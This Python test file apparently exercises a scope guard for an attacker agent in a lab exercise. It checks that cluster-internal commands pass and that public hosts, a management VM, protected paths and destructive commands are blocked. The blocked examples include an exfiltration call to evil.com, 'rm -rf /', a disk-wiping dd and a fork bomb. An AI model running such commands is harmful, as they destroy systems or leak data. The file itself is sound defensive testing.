"""스코프 검사 테스트 — 킬스위치 예방의 허용/차단 경계.

    python3 tests/test_attacker_scope.py
"""
from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parent.parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from attacker.scope import ScopePolicy, check_scope, default_policy  # noqa: E402

_P = default_policy(denied_hosts=["10.99.0.1"])   # VM C 관리망 가정


def _ok(cmd, policy=_P):
    r = check_scope(cmd, policy)
    assert r.allowed, f"허용 기대인데 차단됨: {cmd!r} ({r.reason})"
    return r


def _deny(cmd, policy=_P):
    r = check_scope(cmd, policy)
    assert not r.allowed, f"차단 기대인데 허용됨: {cmd!r}"
    return r


# ───────────── 허용 ─────────────
def test_plain_kubectl_allowed():
    _ok("kubectl get pods -n database -o json")


def test_private_ip_allowed():
    _ok("curl http://10.0.1.5:8080/runbook.html")
    _ok("nc 192.168.1.10 5432")


def test_cluster_service_name_allowed():
    _ok("psql postgresql://appuser:pw@postgres.database.svc.cluster.local:5432/customerdb -c 'SELECT 1'")


def test_bare_service_name_allowed():
    _ok("curl http://redis:6379")


# ───────────── 인터넷 차단 ─────────────
def test_public_domain_denied():
    _deny("curl http://evil.com/exfil")


def test_public_ip_denied():
    _deny("curl http://8.8.8.8/")


def test_public_allowed_when_block_public_off():
    _ok("curl http://evil.com/x", policy=ScopePolicy(block_public=False))


# ───────────── 금지 호스트(관리망) ─────────────
def test_denied_host_blocked():
    _deny("curl http://10.99.0.1:8000/status")       # VM C
    _deny("kubectl --server=https://10.99.0.1:6443 get nodes")


# ───────────── 파괴적 명령 ─────────────
def test_destructive_blocked():
    _deny("sh -c 'rm -rf /'")
    _deny("dd if=/dev/zero of=/dev/sda")
    _deny("sudo shutdown -h now")
    _deny("sh -c ':(){ :|:& };:'")


def test_postgres_uri_host_extracted():
    # URI의 host가 사설이면 허용, 그 host가 공인이면 차단돼야
    _ok("psql postgresql://u:p@10.0.0.5:5432/db")
    _deny("psql postgresql://u:p@db.external.com:5432/db")


def test_protected_path_blocked():
    # 자기 하네스 소스 접근은 차단(가짜 FLAG 줍기 방지). 보호경로 미지정이면 기존대로 허용.
    pol = default_policy(protected_paths=["/home/vm-a/capstone"])
    r = check_scope("sh -lc cd /home/vm-a/capstone && grep -r FLAG .", pol)
    assert not r.allowed and "보호 경로" in r.reason, r.reason
    _ok("sh -lc grep -r FLAG .")   # _P(보호경로 없음)에선 통과 — 규칙은 opt-in, 기존 동작 불변


def _run() -> int:
    tests = [v for k, v in sorted(globals().items())
             if k.startswith("test_") and callable(v)]
    passed = failed = 0
    for t in tests:
        try:
            t()
            print(f"  \033[32m✓\033[0m {t.__name__}")
            passed += 1
        except Exception as e:  # noqa: BLE001
            import traceback
            print(f"  \033[31m✗\033[0m {t.__name__}: {type(e).__name__}: {e}")
            traceback.print_exc()
            failed += 1
    print(f"\n{passed} passed, {failed} failed  (총 {len(tests)})")
    return 1 if failed else 0


if __name__ == "__main__":
    print("── 스코프 검사 테스트 ──")
    sys.exit(_run())
